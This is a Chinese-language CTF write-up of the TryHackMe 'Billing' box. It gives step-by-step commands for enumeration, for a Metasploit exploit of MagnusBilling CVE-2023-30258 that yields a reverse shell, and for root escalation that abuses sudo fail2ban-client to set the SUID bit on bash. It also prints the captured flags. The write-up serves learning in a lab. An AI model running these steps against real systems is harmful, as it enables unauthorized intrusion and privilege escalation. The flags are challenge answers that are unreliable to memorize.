 # TryHackMe - Billing Writeup

**平台**：TryHackMe  
**难度**：Easy  
**操作系统**：Linux  
**IP**：10.144.148.138  
**完成日期**：2026/4/14  

**Tasks**：Gain a shell, find the way and escalate your privileges!

---

## 1. 信息收集 / 枚举 (Enumeration)

### Nmap 扫描
```bash
nmap -sV -T4 -sC 10.144.148.138 -Pn
```
结果：

22/tcp  open  ssh   OpenSSH 9.2p1 Debian 2+deb12u6
80/tcp  open  http  Apache httpd 2.4.62 (Debian)

访问 http://10.144.148.138 后自动跳转到 /mbilling/ 目录。
Web 目录爆破
Bashgobuster dir -u http://10.144.148.138/mbilling -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
发现关键目录：

/mbilling/

关键发现

页面为 MagnusBilling（VoIP 计费系统）
通过查看网页源代码确认版本信息
使用 searchsploit 搜索发现 CVE-2023-30258（MagnusBilling unauthenticated Command Injection）


## 2. 初始访问 (Initial Foothold)
漏洞类型：Command Injection（RCE）
CVE：CVE-2023-30258
利用方式
使用 Metasploit 直接打：
Bashmsfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.144.148.138
set LHOST <你的Kali IP>
exploit
成功获得 www-data 权限的 reverse shell。

## 3. 权限提升 (Privilege Escalation)
枚举 sudo 权限
Bashsudo -l
关键发现：
text(ALL) NOPASSWD: /usr/bin/fail2ban-client
提权利用（Fail2Ban Sudo 提权）
Fail2Ban 以 root 权限运行，我们通过 fail2ban-client 修改 actionban 来让 root 执行任意命令。
完整提权命令：
###  添加自定义 action
sudo /usr/bin/fail2ban-client set sshd addaction evil

###  修改 actionban 为我们想要执行的命令
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"

###  触发 banip，让 root 执行上面的命令
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5

###  使用带 SUID 的 bash 获得 root shell
/bin/bash -p
最终权限：root

## 4. Flag

User Flag：THM{4a6831d5f124b25eefb1e92e0f0da4ca}
Root Flag：THM{33ad5b530e71a172648f424ec23fae60}


## 5. 学到的知识 / 新技巧

遇到登录界面不一定需要爆破
有可能存在未授权 RCE（CVE），直接利用即可拿 shell。
fail2ban-client NOPASSWD 提权
Fail2Ban 必须以 root 权限运行。
actionban 参数会被 root 直接执行。
经典利用方式：修改 actionban 为 chmod +s /bin/bash → 触发 banip → 使用 /bin/bash -p 提权。

GTFOBins 技巧
fail2ban-client 在 GTFOBins 中有明确的 sudo 提权方法（a）和（b），我们使用的是最简单的 (a) 方法。

---

<div align="center">

**Writeup By YRww**

**Keep Hacking**

</div>
